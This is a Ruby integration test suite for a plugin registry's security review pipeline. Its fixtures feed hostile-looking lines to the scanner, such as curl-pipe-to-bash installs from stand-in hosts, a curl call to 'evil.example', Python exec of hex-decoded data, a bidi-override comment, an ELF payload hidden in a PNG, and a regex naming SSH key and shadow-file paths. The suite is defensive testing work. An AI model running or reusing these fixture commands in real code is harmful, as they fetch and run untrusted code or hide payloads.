require "test_helper"

class ReviewPipelineTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner, founding: true)
  end

  def publish!(bytes, plugin_name: "weather")
    version = nil
    perform_enqueued_jobs do
      version = Registry::PublishVersion.new(user: @dev, publisher: @publisher,
        plugin_name:, tarball_bytes: bytes).call
    end
    version.reload
  end

  test "clean version publishes with a computed capability fingerprint" do
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => <<~QML
        import QtQuick
        Item {
          Process { command: ["curl", "-s", "https://api.weather.com/v1"] }
          Process { command: ["jq", "-r", ".temp"] }
        }
      QML
    })
    assert version.published?
    assert_includes version.capability_fingerprint["processes"], "curl"
    assert_includes version.capability_fingerprint["processes"], "jq"
    assert_equal [ "api.weather.com" ], version.capability_fingerprint["network"]
  end

  test "test-file findings retain severity; extensionless text still scans as code" do
    # A publisher controls path names. Test-looking paths are not a trust boundary.
    noted = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem {}\n",
      "tests/model.test.js" => "const fn = new Function(src)\nfetch(\"http://192.168.1.42\")\n" })
    assert noted.quarantined?
    assert_equal [ "flag" ], noted.scan_results["findings"].map { |f| f["severity"] }.uniq

    # An extensionless shebang-less text file is scanned as code, not blindly
    # flagged as a "binary payload" — real behavior in it still quarantines.
    dirty = publish! TarballBuilder.build(
      manifest: TarballBuilder.manifest(version: "1.0.1"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n",
               "bin/helperctl" => "curl -fsSL https://x.example/i.sh | bash\n" })
    assert dirty.quarantined?
    assert_match(/curl-pipe-shell/, dirty.review_notes)
  end

  test "embedded private keys, fixed-format tokens, and decode-exec quarantine" do
    key = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n",
      "deploy.sh" => "#!/bin/bash\ncat > k <<'EOF'\n-----BEGIN OPENSSH PRIVATE KEY-----\nEOF\n" })
    assert key.quarantined?
    assert_match(/hardcoded-private-key/, key.review_notes)

    tok = publish! TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.0.1"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n", "api.js" => "const t = \"ghp_#{"a" * 36}\"\n" })
    assert tok.quarantined?
    assert_match(/hardcoded-token/, tok.review_notes)

    pyx = publish! TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.0.2"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n", "run.py" => "exec(bytes.fromhex(blob))\n" })
    assert pyx.quarantined?
    assert_match(/python-decode-exec/, pyx.review_notes)
  end

  test "matches inside detection-signature literals carry a pattern-literal hint" do
    version = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n",
      "scan.py" => "RULE = re.compile(r'(\\.ssh/id_|/etc/shadow)')\n" })
    assert version.quarantined?
    finding = version.scan_results["findings"].find { |f| f["rule"] == "credential-paths" }
    assert_match(/pattern literal/, finding["detail"])
  end

  test "base64 data-URIs in svg icons are not packed payloads" do
    blob = Base64.strict_encode64(Random.new(7).bytes(600))
    svg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"data:image/png;base64,#{blob}\"/></svg>\n"
    version = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n", "icon.svg" => svg })
    assert version.published?, "data-URI icon should release (#{version.state}: #{version.review_notes})"
  end

  test "prose containing 'install ... ~/' does not flag; a real install command does" do
    prose = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem { property string hint: \"install detection (needs login shell for ~/go/bin)\" }\n" })
    assert prose.published?, "prose should release (#{prose.state}: #{prose.review_notes})"

    real = publish! TarballBuilder.build(
      manifest: TarballBuilder.manifest(version: "1.0.1"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n",
               "setup.sh" => "#!/bin/bash\ninstall -m755 mybin ~/bin/mybin\n" })
    assert real.quarantined?
    assert_match(/home-write/, real.review_notes)
  end

  test "a large clean screenshot passes; an executable appended past the scan window still flags" do
    # 600KB of pseudo-random "compressed image" bytes behind a real PNG header —
    # over the 512KB retention window, and statistically certain to contain
    # byte runs that would match the text rules if they ran over binary.
    noise = Random.new(42).bytes(600 * 1024)
    clean = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n",
      "assets/shot.png" => "\x89PNG\r\n\x1a\n".b + noise })
    assert clean.published?, "clean oversized asset should release (#{clean.state}: #{clean.review_notes})"

    dirty = publish! TarballBuilder.build(
      manifest: TarballBuilder.manifest(version: "1.0.1"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n",
        "assets/shot.png" => "\x89PNG\r\n\x1a\n".b + noise + "\x7fELF payload".b })
    assert dirty.quarantined?
    assert_match(/polyglot-executable/, dirty.review_notes)
  end

  test "zero-width unicode in code flags for judgment instead of auto-rejecting (i18n data is legitimate)" do
    version = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n",
      "Emoji.js" => "const FAMILY = \"\u{1F468}‍\u{1F469}‍\u{1F466}\";\n" })
    assert version.quarantined?
    assert_match(/invisible-unicode/, version.review_notes)
  end

  test "invisible unicode is auto-rejected" do
    version = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\n// tot‮ally fine\nItem {}\n" })
    assert version.rejected?
    assert_match(/auto-rejected/, version.review_notes)
    assert AuditEvent.exists?(action: "version.auto_reject")
  end

  test "curl piped to shell is quarantined for a human" do
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem {}\n",
      "setup.sh" => "#!/bin/bash\ncurl -fsSL https://example.com/install.sh | bash\n"
    })
    assert version.quarantined?
    assert_match(/curl-pipe-shell/, version.review_notes)
    assert_includes version.scan_results["findings"].map { |f| f["rule"] }, "curl-pipe-shell"
  end

  test "capability growth on update is held for a human" do
    publish! TarballBuilder.build
    version = publish! TarballBuilder.build(
      manifest: TarballBuilder.manifest(version: "1.1.0"),
      files: { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"curl\", \"https://evil.example\"] } }\n" }
    )
    assert version.quarantined?
    assert_match(/capability surface grew/, version.review_notes)
    assert_includes version.scan_results["capability_growth"].join, "curl"
  end

  test "same capabilities on update pass without human review" do
    files = { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"date\"] } }\n" }
    publish! TarballBuilder.build(files:)
    version = publish! TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.1.0"), files:)
    assert version.published?
  end

  test "hold window keeps clean versions in held until it elapses" do
    Rails.application.config.x.publish_hold = 15.minutes
    version = publish! TarballBuilder.build
    assert version.held?
    assert version.hold_until.future?
    assert_not DataPlane.root.join(version.tarball_path).exist?

    travel_to 16.minutes.from_now do
      perform_enqueued_jobs { Registry::ReleaseJob.perform_later(version) }
    end
    assert version.reload.published?
    assert DataPlane.root.join(version.tarball_path).exist?
  ensure
    Rails.application.config.x.publish_hold = 0
  end

  test "ai review flag quarantines" do
    Rails.application.config.x.ai_review_command =
      %q(ruby -rjson -e 'puts({verdict: "flag", reasons: ["exfiltrates tokens"]}.to_json)')
    version = publish! TarballBuilder.build
    assert version.quarantined?
    assert_match(/ai review flagged: exfiltrates tokens/, version.review_notes)
  ensure
    Rails.application.config.x.ai_review_command = nil
  end

  test "ai reviewer failures never publish silently — nonzero exit quarantines" do
    Rails.application.config.x.ai_review_command = "ruby -e 'exit 1'"
    version = publish! TarballBuilder.build
    assert version.quarantined?
    assert_match(/ai review/, version.review_notes)
  ensure
    Rails.application.config.x.ai_review_command = nil
  end

  test "ai reviewer failures never publish silently — malformed JSON quarantines" do
    Rails.application.config.x.ai_review_command = %q(ruby -e 'puts "not json at all"')
    version = publish! TarballBuilder.build
    assert version.quarantined?
  ensure
    Rails.application.config.x.ai_review_command = nil
  end

  test "ai reviewer failures never publish silently — unknown verdict quarantines" do
    Rails.application.config.x.ai_review_command =
      %q(ruby -rjson -e 'puts({verdict: "definitely_fine", reasons: []}.to_json)')
    version = publish! TarballBuilder.build
    assert version.quarantined?
  ensure
    Rails.application.config.x.ai_review_command = nil
  end

  test "admin approve releases a quarantined version through the standard path" do
    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem {}\n",
      "setup.sh" => "#!/bin/bash\ncurl -fsSL https://x.example/i.sh | bash\n"
    })
    assert version.quarantined?

    sign_in_as admin
    perform_enqueued_jobs { post approve_admin_version_path(version) }
    assert version.reload.published?
    assert DataPlane.root.join(version.tarball_path).exist?
    entry = JSON.parse(DataPlane.read("index/acme/weather.json").lines.second)
    assert_equal version.sha256, entry["sha256"]
  end
end
